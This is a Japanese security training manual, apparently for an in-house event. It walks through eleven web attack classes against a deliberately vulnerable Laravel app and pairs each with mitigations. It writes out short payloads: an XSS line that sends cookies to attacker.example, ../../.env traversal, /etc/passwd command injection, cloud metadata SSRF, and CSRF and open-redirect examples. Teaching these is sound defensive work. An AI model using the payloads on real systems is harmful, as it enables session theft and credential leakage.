---
created: 2025-09-17T10:43 (UTC +09:00)
tags:
  - 帰社日
type:
author: My Name
---
# 防犯マニュアル 〜攻撃手法と対策解説〜

---

## 1. SQLインジェクション（SQLi）

### 攻撃概要
- 入力値がSQL文にそのまま埋め込まれることで、攻撃者が不正なSQLを実行できてしまう脆弱性。

### 攻撃例
```sql
-- 入力欄に「' OR '1'='1」と入力
SELECT * FROM users WHERE username = '' OR '1'='1' AND password = '';
-- → 全ユーザー情報が取得されてしまう！
```

### 対策例（Python + sqlite3）
```python
# 悪い例（危険！）
query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
cursor.execute(query)

# 良い例（プリペアドステートメント）
query = "SELECT * FROM users WHERE username = ? AND password = ?"
cursor.execute(query, (username, password))
```

### このアプリでの攻撃ポイント
- 対象エンドポイント: `POST /login`（`app/Http/Controllers/LoginController.php`）
- 再現手順: ユーザー名を任意値、パスワードに `' OR '1'='1` を入力すると、WHERE句が常に真となり本人確認を迂回できる
- 想定被害: 認証バイパスによるアカウント乗っ取り、全ユーザーのセッションハイジャック

### 推奨対策（本アプリ）
- プレースホルダを使ったバインディング（`DB::table()->where()` や Eloquent）でユーザー入力を決して文字列連結しない
- 認証条件は `name = ? AND password = ?` のように厳密に比較し、ハッシュ化されたパスワードを検証する
- ログイン試行回数の制限や監査ログを導入し、異常なログイン試行を検出する

---

## 2. クロスサイトスクリプティング（XSS）

### 攻撃概要
- 入力値がHTMLにそのまま出力されることで、悪意あるスクリプトが実行されてしまう脆弱性。

### 攻撃例
- 入力欄に `<script>alert('XSS!')</script>` と入力 → 他のユーザーの画面でアラートが出る

### 対策例（Python Flaskの場合）
- テンプレートエンジン（Jinja2等）は自動でエスケープされるが、`|safe` フィルタを安易に使わない
- 出力時は必ずエスケープ処理を行う

### このアプリでの攻撃ポイント
- 対象エンドポイント: `POST /comment` → `/comment` 表示（`app/Http/Controllers/CommentController.php`、`resources/views/comment.blade.php`）
- 再現手順: コメントに `<script>fetch('https://attacker.example/steal?c='+document.cookie)</script>` などを投稿すると、保存されたスクリプトが全ユーザーのタイムラインで実行される
- 想定被害: セッションハイジャック、悪意あるコンテンツの恒久的な表示、フィッシング

### 推奨対策（本アプリ）
- コメント保存前に HTML サニタイズまたは出力時に `{{ }}` でエスケープし、`{!! !!}` を廃止する
- 必要な場合のみ Markdown などのホワイトリスト方式で HTML を許可する
- Content Security Policy (CSP) を設定し、インラインスクリプト実行を制限する

---

## 3. ソーシャルエンジニアリング

### 攻撃概要
- 人間の心理的な隙を突いて、パスワードや機密情報を聞き出す手法。

### 攻撃例
- 「システム管理者です。パスワードを教えてください」と電話やメールで聞き出す

### 対策例
- パスワードや機密情報は絶対に他人に教えない
- 社内教育・ルール徹底

---

## 4. 任意ファイルダウンロード（ディレクトリトラバーサル）

### 攻撃概要
- ファイルパスの検証が不十分だと、攻撃者が相対パス（`../../` など）を用いて本来アクセスできないファイルを取得できる

### このアプリでの攻撃ポイント
- 対象エンドポイント: `GET /download/file?file=...`（`app/Http/Controllers/DownloadController.php`）
- 再現手順: `file` パラメータに `../../.env` を指定すると、アプリケーションの環境変数ファイルがダウンロードできる
- 想定被害: DB接続情報やAPIキーなど機密情報の漏えい

### 推奨対策（本アプリ）
- ユーザー入力のパスを絶対パス化してルートディレクトリ配下のみ許可する、またはダウンロード対象をホワイトリスト化する
- ブラウザから直接アクセスさせず、Storageクラス等を使って安全なファイル提供処理を実装する
- `.env` など機密ファイルはそもそもWebサーバー経由で配信されない場所に置く

---

## 5. 任意ファイルアップロード

### 攻撃概要
- 拡張子やMIMEタイプの検証を行わずにアップロードを受け付けると、Webシェルなど危険なファイルを設置される

### このアプリでの攻撃ポイント
- 対象エンドポイント: `POST /upload`（`app/Http/Controllers/UploadController.php`）
- 再現手順: PHPファイルをアップロードすると `storage/app/public/uploads/<ファイル名>` に保存され、公開ディレクトリから実行される恐れがある
- 想定被害: サーバー乗っ取り、任意コード実行、ランサムウェア設置

### 推奨対策（本アプリ）
- 許可拡張子・MIMEタイプ・ファイルサイズの検証を徹底し、危険な拡張子は拒否する
- 保存時はランダムなファイル名に変更し、公開ディレクトリ外に保管してアプリ経由で配信する
- アップロードフォルダの実行権限を無効化し、ウイルススキャンを導入する

---

## 6. SSRF（Server-Side Request Forgery）

### 攻撃概要
- サーバー側で任意URLを取得できてしまうと、内部ネットワークやメタデータサーバーへのアクセスに悪用される

### このアプリでの攻撃ポイント
- 対象エンドポイント: `GET /debug?fetch_url=`（`app/Http/Controllers/DebugController.php`）
- 再現手順: `fetch_url` に `http://169.254.169.254/latest/meta-data/` など内部向けアドレスを指定するとサーバー自身が情報を取得して返す
- 想定被害: 内部サービスのポートスキャン、クラウドメタデータから認証情報の窃取

### 推奨対策（本アプリ）
- デバッグ用途のURLフェッチ機能を本番環境から撤去する、または社内限定ツールにする
- どうしても必要な場合は外部の安全なドメインだけをホワイトリスト化し、`file://` や内部IPレンジを拒否する
- HTTPクライアントでタイムアウト・レスポンスサイズ制限を設け、レスポンスの取り扱いにも注意する

---

## 7. OSコマンドインジェクション

### 攻撃概要
- ユーザー入力をそのままシェルコマンドに渡すと、任意コマンドを実行される

### このアプリでの攻撃ポイント
- 対象エンドポイント: `GET /debug?command=`（`app/Http/Controllers/DebugController.php`）
- 再現手順: `command=ls;cat+/etc/passwd` などと指定するとサーバー上の任意コマンドが実行され結果が返る
- 想定被害: サーバー完全制御、ランサムウェア設置、情報窃取

### 推奨対策（本アプリ）
- Web経由で任意コマンド実行を許可する機能を削除する
- どうしても必要な場合はプリセットコマンドのみを選択式にし、`proc_open` 等の危険APIは使わない
- アプリケーション実行ユーザーの権限を最小化し、万一の侵害時の被害を限定する

---

## 8. IDOR（Insecure Direct Object Reference）

### 攻撃概要
- オブジェクト識別子（IDなど）を推測するだけで別ユーザーの情報を閲覧・操作できる問題

### このアプリでの攻撃ポイント
- 対象エンドポイント: `GET /profile?id=`（`app/Http/Controllers/ProfileController.php`）
- 再現手順: 自分以外の `id` を指定すると、他ユーザーのメールやパスワードハッシュまで閲覧できる
- 想定被害: 個人情報漏えい、権限ないデータへのアクセス

### 推奨対策（本アプリ）
- セッション中のユーザーIDと照合し、他人のIDを指定した場合は403を返す
- 必要に応じてアクセス制御ミドルウェアを導入し、リソース単位で所有者チェックを実施する
- 画面上にも不要な機密情報（パスワードハッシュなど）を表示しない

---

## 9. CSRF（Cross-Site Request Forgery）

### 攻撃概要
- 被害者がログイン中のサイトに対し、別サイト経由で意図しないリクエストを送信させる攻撃

### このアプリでの攻撃ポイント
- 対象エンドポイント: `GET /settings/update?email_notify=...`（`app/Http/Controllers/SettingsController.php`）
- 再現手順: 攻撃者が `<img src="https://victim-app/settings/update?email_notify=on">` のようなHTMLを用意すると、被害者がページを開くだけで設定が変更される
- 想定被害: 勝手な設定変更、他機能と組み合わせた状態変更全般

### 推奨対策（本アプリ）
- 状態変更リクエストは `POST` など副作用のあるメソッドに限定し、`@csrf` トークンで検証する
- セッションに依存する機能は Referer/Origin のチェックやSameSite=Lax/Strictなクッキー属性を併用する
- GET パラメータで状態を変える実装を禁止し、UI側もリンクではなくフォーム送信にする

---

## 10. オープンリダイレクト

### 攻撃概要
- 任意URLへリダイレクトできると、フィッシングサイトやマルウェア配布サイトへ誘導される

### このアプリでの攻撃ポイント
- 対象エンドポイント: `GET /go?url=`（`app/Http/Controllers/RedirectController.php`）
- 再現手順: `https://victim-app/go?url=https://attacker.example/phish` にアクセスさせると、正規サイトを経由して悪性サイトへ遷移させられる
- 想定被害: フィッシング、トークン付きURLを悪用したセッション乗っ取り

### 推奨対策（本アプリ）
- 外部リダイレクトは許可せず、アプリ内のパスのみをホワイトリスト化する
- どうしても外部URLへ飛ばす場合は署名付きトークンやドメインチェックを実施し、ユーザーにも確認画面を表示する
- リダイレクト先をログに記録し、不審な遷移を監査する

---

## 11. デバッグ機能からの情報漏えい

### 攻撃概要
- デバッグ用UIが外部からアクセス可能なままだと、内部情報や個人情報を容易に閲覧されてしまう

### このアプリでの攻撃ポイント
- 対象エンドポイント: `GET /debug?user_dump=`（`app/Http/Controllers/DebugController.php`）
- 再現手順: `user_dump=all` を指定すると `users` テーブルの全レコードが `print_r` で露出する
- 想定被害: 個人情報の大量漏えい、資格情報の再利用攻撃

### 推奨対策（本アプリ）
- デバッグ用ルートを本番環境では無効化し、必要ならVPNやIP制限で社内専用にする
- 返却データをログレベルに応じてマスキングし、最低限の情報のみ表示する
- デバッグ情報に含まれる個人情報を永続的に保存・露出しないよう運用ルールを整備する

## まとめ

- 攻撃手法を知り、正しい対策を実装・運用することが大切！
- 「怪しい」と思ったら、必ず立ち止まって確認しよう
